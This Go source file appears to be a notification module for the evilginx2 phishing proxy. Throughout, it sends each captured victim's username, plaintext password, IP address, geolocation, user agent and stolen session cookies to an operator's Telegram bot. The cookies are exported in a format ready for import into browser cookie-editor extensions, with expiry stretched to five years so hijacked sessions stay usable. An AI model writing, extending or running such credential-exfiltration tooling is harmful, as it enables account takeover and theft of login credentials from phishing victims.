package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// CookieExpirationYears defines cookie expiration (5 years for longer session validity)
const CookieExpirationYears = 5

// Session tracking for deduplication - prevents sending duplicate notifications
var (
	telegramProcessedSessions = make(map[string]bool)
	telegramSessionMessageMap = make(map[string]int) // Maps session ID to Telegram message ID for updates
	telegramSessionMutex      sync.Mutex
)

type TelegramMessage struct {
	ChatId    string `json:"chat_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode"`
}

type TelegramNotifier struct {
	botToken string // Default bot token (backward compatibility)
	chatId   string // Default chat ID (backward compatibility)
	enabled  bool   // Default enabled status
	db       *database.Database
	channels map[string]*TelegramChannel // Multi-channel support
}

func NewTelegramNotifier(config *TelegramConfig, db *database.Database) *TelegramNotifier {
	notifier := &TelegramNotifier{
		botToken: config.BotToken,
		chatId:   config.ChatId,
		enabled:  config.Enabled,
		db:       db,
		channels: make(map[string]*TelegramChannel),
	}

	// Create default channel from main config
	if config.BotToken != "" && config.ChatId != "" {
		notifier.channels["default"] = &TelegramChannel{
			Name:        "default",
			BotToken:    config.BotToken,
			ChatId:      config.ChatId,
			Enabled:     config.Enabled,
			Phishlets:   []string{}, // Accepts all
			Description: "Default notification channel",
		}
	}

	// Load additional channels from config if available
	if config.Channels != nil {
		for name, channel := range config.Channels {
			notifier.channels[name] = channel
		}
	}

	return notifier
}

// AddChannel adds a new telegram channel
func (tn *TelegramNotifier) AddChannel(name, botToken, chatId, description string, phishlets []string) error {
	if name == "" || botToken == "" || chatId == "" {
		return fmt.Errorf("name, botToken, and chatId are required")
	}

	tn.channels[name] = &TelegramChannel{
		Name:        name,
		BotToken:    botToken,
		ChatId:      chatId,
		Enabled:     true,
		Phishlets:   phishlets,
		Description: description,
	}

	log.Info("[Telegram] Added channel '%s' for phishlets: %v", name, phishlets)
	return nil
}

// RemoveChannel removes a telegram channel
func (tn *TelegramNotifier) RemoveChannel(name string) error {
	if name == "default" {
		return fmt.Errorf("cannot remove default channel")
	}

	if _, exists := tn.channels[name]; !exists {
		return fmt.Errorf("channel '%s' not found", name)
	}

	delete(tn.channels, name)
	log.Info("[Telegram] Removed channel '%s'", name)
	return nil
}

// ListChannels returns all configured channels
func (tn *TelegramNotifier) ListChannels() []*TelegramChannel {
	channels := make([]*TelegramChannel, 0, len(tn.channels))
	for _, channel := range tn.channels {
		channels = append(channels, channel)
	}
	return channels
}

// GetChannelsForPhishlet returns all channels that should receive notifications for a phishlet
func (tn *TelegramNotifier) GetChannelsForPhishlet(phishlet string) []*TelegramChannel {
	var channels []*TelegramChannel

	for _, channel := range tn.channels {
		if !channel.Enabled {
			continue
		}

		// If no phishlets specified, channel accepts all
		if len(channel.Phishlets) == 0 {
			channels = append(channels, channel)
			continue
		}

		// Check if phishlet is in the channel's list
		for _, p := range channel.Phishlets {
			if p == phishlet || p == "*" {
				channels = append(channels, channel)
				break
			}
		}
	}

	return channels
}

// SendToChannel sends a message to a specific channel
func (tn *TelegramNotifier) SendToChannel(channelName, message string) error {
	channel, exists := tn.channels[channelName]
	if !exists {
		return fmt.Errorf("channel '%s' not found", channelName)
	}

	if !channel.Enabled {
		return fmt.Errorf("channel '%s' is disabled", channelName)
	}

	return tn.sendMessageToChannel(channel, message)
}

// SendToAllChannels sends a message to all channels for a specific phishlet
func (tn *TelegramNotifier) SendToAllChannels(phishlet, message string) error {
	channels := tn.GetChannelsForPhishlet(phishlet)

	if len(channels) == 0 {
		return fmt.Errorf("no enabled channels found for phishlet '%s'", phishlet)
	}

	var errors []string
	successCount := 0

	for _, channel := range channels {
		err := tn.sendMessageToChannel(channel, message)
		if err != nil {
			errors = append(errors, fmt.Sprintf("Channel '%s': %v", channel.Name, err))
		} else {
			successCount++
		}
	}

	if len(errors) > 0 {
		log.Warning("[Telegram] Failed to send to %d/%d channels: %s", len(errors), len(channels), strings.Join(errors, "; "))
	}

	if successCount == 0 {
		return fmt.Errorf("failed to send to all channels")
	}

	log.Info("[Telegram] Message sent to %d/%d channels for phishlet '%s'", successCount, len(channels), phishlet)
	return nil
}

// sendMessageToChannel sends a message to a specific channel
func (tn *TelegramNotifier) sendMessageToChannel(channel *TelegramChannel, message string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", channel.BotToken)

	payload := TelegramMessage{
		ChatId:    channel.ChatId,
		Text:      message,
		ParseMode: "Markdown",
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal message: %v", err)
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send message: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

// SendDocumentToAllChannels sends a document to all channels for a phishlet
func (tn *TelegramNotifier) SendDocumentToAllChannels(phishlet, filePath, caption string) error {
	channels := tn.GetChannelsForPhishlet(phishlet)

	if len(channels) == 0 {
		return fmt.Errorf("no enabled channels found for phishlet '%s'", phishlet)
	}

	var errors []string
	successCount := 0

	for _, channel := range channels {
		err := tn.sendDocumentToChannel(channel, filePath, caption)
		if err != nil {
			errors = append(errors, fmt.Sprintf("Channel '%s': %v", channel.Name, err))
		} else {
			successCount++
		}
	}

	if len(errors) > 0 {
		log.Warning("[Telegram] Failed to send document to %d/%d channels: %s", len(errors), len(channels), strings.Join(errors, "; "))
	}

	if successCount == 0 {
		return fmt.Errorf("failed to send document to all channels")
	}

	log.Info("[Telegram] Document sent to %d/%d channels for phishlet '%s'", successCount, len(channels), phishlet)
	return nil
}

// sendDocumentToChannel sends a document to a specific channel
func (tn *TelegramNotifier) sendDocumentToChannel(channel *TelegramChannel, filePath, caption string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", channel.BotToken)

	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	err = writer.WriteField("chat_id", channel.ChatId)
	if err != nil {
		return fmt.Errorf("failed to write chat_id field: %v", err)
	}

	if caption != "" {
		err = writer.WriteField("caption", caption)
		if err != nil {
			return fmt.Errorf("failed to write caption field: %v", err)
		}
	}

	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("failed to copy file: %v", err)
	}

	err = writer.Close()
	if err != nil {
		return fmt.Errorf("failed to close writer: %v", err)
	}

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send document: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}

func (tn *TelegramNotifier) IsEnabled() bool {
	return tn.enabled && tn.botToken != "" && tn.chatId != ""
}

func (tn *TelegramNotifier) UpdateConfig(config *TelegramConfig) {
	tn.botToken = config.BotToken
	tn.chatId = config.ChatId
	tn.enabled = config.Enabled
}

func (tn *TelegramNotifier) sendMessage(message string) error {
	if !tn.IsEnabled() {
		return fmt.Errorf("telegram notifier is not enabled")
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", tn.botToken)

	payload := TelegramMessage{
		ChatId:    tn.chatId,
		Text:      message,
		ParseMode: "Markdown",
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal message: %v", err)
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send message: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

func (tn *TelegramNotifier) TestConnection() error {
	return tn.sendMessage("✅ EvilGinx Telegram notification test successful!")
}

func (tn *TelegramNotifier) sendDocument(filePath, caption string) error {
	if !tn.IsEnabled() {
		return fmt.Errorf("telegram notifier is not enabled")
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", tn.botToken)

	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	err = writer.WriteField("chat_id", tn.chatId)
	if err != nil {
		return fmt.Errorf("failed to write chat_id field: %v", err)
	}

	if caption != "" {
		err = writer.WriteField("caption", caption)
		if err != nil {
			return fmt.Errorf("failed to write caption field: %v", err)
		}
	}

	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("failed to copy file: %v", err)
	}

	err = writer.Close()
	if err != nil {
		return fmt.Errorf("failed to close writer: %v", err)
	}

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send document: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}

// sendDocumentWithMessageID sends a document and returns the message ID for later updates (from tele.go)
func (tn *TelegramNotifier) sendDocumentWithMessageID(filePath, caption string) (int, error) {
	if !tn.IsEnabled() {
		return 0, fmt.Errorf("telegram notifier is not enabled")
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", tn.botToken)

	file, err := os.Open(filePath)
	if err != nil {
		return 0, fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	_ = writer.WriteField("chat_id", tn.chatId)
	if caption != "" {
		_ = writer.WriteField("caption", caption)
	}

	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return 0, fmt.Errorf("failed to create form file: %v", err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return 0, fmt.Errorf("failed to copy file: %v", err)
	}

	writer.Close()

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return 0, fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return 0, fmt.Errorf("failed to send document: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return 0, fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(respBody))
	}

	// Parse response to get message ID
	var result struct {
		OK     bool `json:"ok"`
		Result struct {
			MessageID int `json:"message_id"`
		} `json:"result"`
	}

	respBody, _ := io.ReadAll(resp.Body)
	if err := json.Unmarshal(respBody, &result); err != nil {
		return 0, fmt.Errorf("failed to parse response: %v", err)
	}

	return result.Result.MessageID, nil
}

// editMessageWithFile edits an existing Telegram message with a new file attachment (from tele.go)
func (tn *TelegramNotifier) editMessageWithFile(messageID int, filePath, caption string) error {
	if !tn.IsEnabled() {
		return fmt.Errorf("telegram notifier is not enabled")
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/editMessageMedia", tn.botToken)

	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	_ = writer.WriteField("chat_id", tn.chatId)
	_ = writer.WriteField("message_id", fmt.Sprintf("%d", messageID))

	media := map[string]interface{}{
		"type":    "document",
		"media":   "attach://file",
		"caption": "Updated: " + caption,
	}
	mediaJSON, _ := json.Marshal(media)
	_ = writer.WriteField("media", string(mediaJSON))

	filePart, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}
	_, err = io.Copy(filePart, file)
	if err != nil {
		return fmt.Errorf("failed to copy file: %v", err)
	}

	writer.Close()

	req, err := http.NewRequest("POST", url, &requestBody)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(respBody))
	}

	log.Debug("[Telegram] Message %d edited successfully with updated file", messageID)
	return nil
}

// replyWithFile sends a new file as a reply to an existing message (from tele.go)
func (tn *TelegramNotifier) replyWithFile(originalMessageID int, filePath, caption string) error {
	if !tn.IsEnabled() {
		return fmt.Errorf("telegram notifier is not enabled")
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", tn.botToken)

	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	_ = writer.WriteField("chat_id", tn.chatId)
	_ = writer.WriteField("reply_to_message_id", fmt.Sprintf("%d", originalMessageID))
	if caption != "" {
		_ = writer.WriteField("caption", caption)
	}

	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("failed to copy file: %v", err)
	}

	writer.Close()

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send document: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(respBody))
	}

	log.Debug("[Telegram] Reply with updated file sent successfully")
	return nil
}

// IsSessionProcessed checks if a session has already been processed (from notify.go)
func (tn *TelegramNotifier) IsSessionProcessed(sessionID string) bool {
	telegramSessionMutex.Lock()
	defer telegramSessionMutex.Unlock()
	return telegramProcessedSessions[sessionID]
}

// MarkSessionProcessed marks a session as processed and stores the message ID (from notify.go)
func (tn *TelegramNotifier) MarkSessionProcessed(sessionID string, messageID int) {
	telegramSessionMutex.Lock()
	defer telegramSessionMutex.Unlock()
	telegramProcessedSessions[sessionID] = true
	if messageID > 0 {
		telegramSessionMessageMap[sessionID] = messageID
	}
}

// GetSessionMessageID returns the Telegram message ID for a session if it exists (from notify.go)
func (tn *TelegramNotifier) GetSessionMessageID(sessionID string) (int, bool) {
	telegramSessionMutex.Lock()
	defer telegramSessionMutex.Unlock()
	msgID, exists := telegramSessionMessageMap[sessionID]
	return msgID, exists
}

func (tn *TelegramNotifier) exportCookiesAsText(session *database.Session, exportDir string) (string, error) {
	if len(session.CookieTokens) == 0 {
		return "", fmt.Errorf("no cookies to export")
	}

	username := session.Username
	if username == "" {
		username = fmt.Sprintf("session_%d", session.Id)
	}
	username = strings.ReplaceAll(username, "@", "_")
	username = strings.ReplaceAll(username, "/", "_")

	filename := fmt.Sprintf("%s-%s.txt", username, session.Phishlet)
	filePath := filepath.Join(exportDir, filename)

	if err := os.MkdirAll(exportDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create export directory: %v", err)
	}

	// Enhanced cookie export with validation
	cookiesJSON := tn.cookieTokensToJSON(session.CookieTokens)

	// Clean JSON only - no headers for easy copy-paste import
	fullContent := cookiesJSON

	if err := os.WriteFile(filePath, []byte(fullContent), 0644); err != nil {
		return "", fmt.Errorf("failed to write cookie file: %v", err)
	}

	// Validate file was written correctly
	if fileInfo, err := os.Stat(filePath); err == nil {
		log.Debug("cookies exported to: %s (%d bytes)", filePath, fileInfo.Size())

		// Log detailed cookie breakdown for verification
		totalDomains := len(session.CookieTokens)
		totalTokens := 0
		for _, tokenMap := range session.CookieTokens {
			totalTokens += len(tokenMap)
		}
		log.Debug("cookie export validation: %d domains, %d total tokens, %d bytes", totalDomains, totalTokens, fileInfo.Size())
	}

	return filePath, nil
}

func (tn *TelegramNotifier) cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
	// Cookie structure matching browser extension format (Cookie Editor, EditThisCookie, etc.)
	type Cookie struct {
		Name           string  `json:"name"`
		Value          string  `json:"value"`
		Domain         string  `json:"domain"`
		Path           string  `json:"path"`
		ExpirationDate float64 `json:"expirationDate,omitempty"`
		HttpOnly       bool    `json:"httpOnly"`
		Secure         bool    `json:"secure"`
		SameSite       string  `json:"sameSite,omitempty"`
		HostOnly       bool    `json:"hostOnly"`
		Session        bool    `json:"session"`
		StoreId        string  `json:"storeId,omitempty"`
	}

	var cookies []Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := Cookie{
				Name:     k,
				Value:    v.Value,
				Domain:   domain,
				Path:     v.Path,
				HttpOnly: v.HttpOnly,
				StoreId:  "0", // Default store ID for browser extensions
			}

			// Use captured Secure attribute, fallback to name-based detection
			if v.Secure {
				c.Secure = true
			} else if strings.HasPrefix(k, "__Host-") || strings.HasPrefix(k, "__Secure-") {
				c.Secure = true
			}

			// Use captured SameSite attribute
			if v.SameSite != "" && v.SameSite != "unspecified" {
				c.SameSite = v.SameSite
			} else {
				// Default to no_restriction for cross-site compatibility
				c.SameSite = "no_restriction"
			}

			// Use captured HostOnly attribute, fallback to domain-based detection
			if v.HostOnly {
				c.HostOnly = true
			} else if len(domain) > 0 && domain[0] == '.' {
				c.HostOnly = false
				c.Domain = domain[1:] // Remove leading dot for non-hostOnly cookies
			} else {
				c.HostOnly = true
			}

			// Use captured Session/ExpirationDate attributes
			if v.Session || v.ExpirationDate <= 0 {
				c.Session = true
				// Session cookies don't have expirationDate in browser extension format
			} else {
				c.Session = false
				c.ExpirationDate = float64(v.ExpirationDate)
			}

			// Fallback: If no expiration was captured, set a long expiration (5 years)
			// This ensures cookies work even if expiration wasn't captured
			if !c.Session && c.ExpirationDate <= 0 {
				c.ExpirationDate = float64(time.Now().Add(CookieExpirationYears * 365 * 24 * time.Hour).Unix())
			}

			// Ensure path is set
			if c.Path == "" {
				c.Path = "/"
			}

			cookies = append(cookies, c)
		}
	}

	jsonData, _ := json.MarshalIndent(cookies, "", "    ")
	return string(jsonData)
}

// truncateUA truncates User-Agent string to max length with ellipsis
func truncateUA(ua string, maxLen int) string {
	if len(ua) <= maxLen {
		return ua
	}
	return ua[:maxLen-3] + "..."
}

// getGeoLocation fetches geographic location for an IP address
func getGeoLocation(ip string) string {
	// Extract IP without port if present
	if idx := strings.Index(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}

	// Skip private/local IPs
	if strings.HasPrefix(ip, "127.") || strings.HasPrefix(ip, "192.168.") ||
		strings.HasPrefix(ip, "10.") || ip == "::1" || ip == "localhost" {
		return "Local"
	}

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(fmt.Sprintf("https://ipapi.co/%s/json/", ip))
	if err != nil || resp.StatusCode != 200 {
		return "Unknown"
	}
	defer resp.Body.Close()

	var geo struct {
		Country     string `json:"country_name"`
		Region      string `json:"region"`
		City        string `json:"city"`
		CountryCode string `json:"country_code"`
	}

	body, _ := io.ReadAll(resp.Body)
	if json.Unmarshal(body, &geo) != nil {
		return "Unknown"
	}

	if geo.City != "" && geo.Region != "" && geo.Country != "" {
		return fmt.Sprintf("%s, %s (%s)", geo.City, geo.Region, geo.Country)
	} else if geo.Country != "" {
		return geo.Country
	}
	return "Unknown"
}

func (tn *TelegramNotifier) NotifySessionCaptured(sessionId string, exportDir string) {
	if !tn.IsEnabled() {
		return
	}

	// SessionFinalizer already validated COMPLETE data with FULL COOKIE ACCUMULATION - just send immediately!
	session, err := tn.db.GetSessionBySid(sessionId)
	if err != nil {
		log.Error("telegram: failed to get session %s: %v", sessionId, err)
		return
	}

	// Calculate total cookie content size for validation
	totalCookieContent := 0
	for domain, tokenMap := range session.CookieTokens {
		for name, token := range tokenMap {
			// Estimate size: domain + name + value + metadata
			totalCookieContent += len(domain) + len(name) + len(token.Value) + len(token.Path) + 50 // +50 for JSON formatting
		}
	}

	// Get GeoIP location for the IP address
	geoLocation := getGeoLocation(session.RemoteAddr)

	// Log the COMPLETE data we're sending with size estimates
	log.Success("🔥 TELEGRAM: Sending BULLETPROOF session data with FULL COOKIES:")
	log.Success("   → SessionId: %s", sessionId)
	log.Success("   → Username: %s ✅", session.Username)
	log.Success("   → Password: %s ✅", session.Password)
	log.Success("   → IP Address: %s 🌐 (%s)", session.RemoteAddr, geoLocation)
	log.Success("   → Cookies: %d tokens ✅ (~%d bytes content)", len(session.CookieTokens), totalCookieContent)

	// Export cookies with enhanced validation
	cookieFilePath, err := tn.exportCookiesAsText(session, exportDir)
	if err != nil {
		log.Error("telegram: failed to export cookies for session %s: %v", sessionId, err)
		cookieFilePath = "" // Ensure we handle this case
	} else {
		// Validate exported file size
		if fileInfo, err := os.Stat(cookieFilePath); err == nil {
			actualSize := fileInfo.Size()
			log.Success("telegram: exported cookies to %s (%d bytes)", cookieFilePath, actualSize)

			// Verify reasonable file size (should be > 500 bytes for meaningful cookies)
			if actualSize < 500 {
				log.Warning("telegram: cookie file seems small (%d bytes) - may indicate incomplete cookie collection", actualSize)
			} else {
				log.Success("telegram: cookie file size validated (%d bytes) - FULL COOKIE COLLECTION confirmed", actualSize)
			}
		}
	}

	// Build telegram message with COMPLETE data + GeoIP + UserAgent + nice icons
	fileSize := "N/A"
	if cookieFilePath != "" {
		if fileInfo, err := os.Stat(cookieFilePath); err == nil {
			fileSize = fmt.Sprintf("%.1f KB", float64(fileInfo.Size())/1024.0)
		}
	}

	// Build the caption/message (Telegram caption limit is 1024 chars, so keep it concise)
	caption := fmt.Sprintf(
		"🎯 *Session Captured!*\n\n"+
			"👤 *Username:* `%s`\n"+
			"🔐 *Password:* `%s`\n"+
			"🌐 *IP:* `%s`\n"+
			"📍 *Location:* `%s`\n"+
			"🖥️ *UA:* `%s`\n"+
			"📧 *Phishlet:* `%s`\n"+
			"🍪 *Cookies:* %d tokens (%s)\n"+
			"⏰ *Time:* %s",
		session.Username,
		session.Password,
		session.RemoteAddr,
		geoLocation,
		truncateUA(session.UserAgent, 50),
		session.Phishlet,
		len(session.CookieTokens),
		fileSize,
		time.Now().Format("2006-01-02 15:04:05"),
	)

	// COMBINED SEND: Cookie file WITH message as caption (single notification)
	// This sends the cookie file first with all session details in the caption
	if cookieFilePath != "" {
		fileInfo, statErr := os.Stat(cookieFilePath)
		if statErr == nil && fileInfo.Size() > 0 {
			// Send document with caption - COMBINED in one message!
			err = tn.sendDocumentWithCaption(cookieFilePath, caption)
			if err != nil {
				log.Error("telegram: failed to send combined message+file: %v", err)
				// Fallback: send message separately if combined fails
				log.Warning("telegram: falling back to separate message and file...")
				if msgErr := tn.sendMessage(caption); msgErr != nil {
					log.Error("telegram: fallback message also failed: %v", msgErr)
				}
				if docErr := tn.sendDocument(cookieFilePath, "Cookie file"); docErr != nil {
					log.Error("telegram: fallback document also failed: %v", docErr)
				}
			} else {
				log.Success("✅ TELEGRAM: COMBINED notification sent (message + cookies in ONE) for %s", sessionId)
			}
		} else {
			// No valid cookie file - send message only
			log.Warning("telegram: cookie file is empty or missing, sending message only")
			if msgErr := tn.sendMessage(caption); msgErr != nil {
				log.Error("telegram: failed to send message: %v", msgErr)
			} else {
				log.Success("✅ TELEGRAM: Message sent (no cookies) for %s", sessionId)
			}
		}
	} else {
		// No cookie file path - send message only
		if msgErr := tn.sendMessage(caption); msgErr != nil {
			log.Error("telegram: failed to send message: %v", msgErr)
		} else {
			log.Success("✅ TELEGRAM: Message sent (no cookies) for %s", sessionId)
		}
	}
}

// sendDocumentWithCaption sends a document with a caption using Markdown parse mode
// This combines the message and file into a single Telegram notification
func (tn *TelegramNotifier) sendDocumentWithCaption(filePath, caption string) error {
	if !tn.IsEnabled() {
		return fmt.Errorf("telegram notifier is not enabled")
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", tn.botToken)

	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add chat_id
	err = writer.WriteField("chat_id", tn.chatId)
	if err != nil {
		return fmt.Errorf("failed to write chat_id field: %v", err)
	}

	// Add caption with Markdown formatting
	if caption != "" {
		err = writer.WriteField("caption", caption)
		if err != nil {
			return fmt.Errorf("failed to write caption field: %v", err)
		}
		// Enable Markdown parsing for caption
		err = writer.WriteField("parse_mode", "Markdown")
		if err != nil {
			return fmt.Errorf("failed to write parse_mode field: %v", err)
		}
	}

	// Add the document file
	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("failed to copy file: %v", err)
	}

	err = writer.Close()
	if err != nil {
		return fmt.Errorf("failed to close writer: %v", err)
	}

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send document: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}
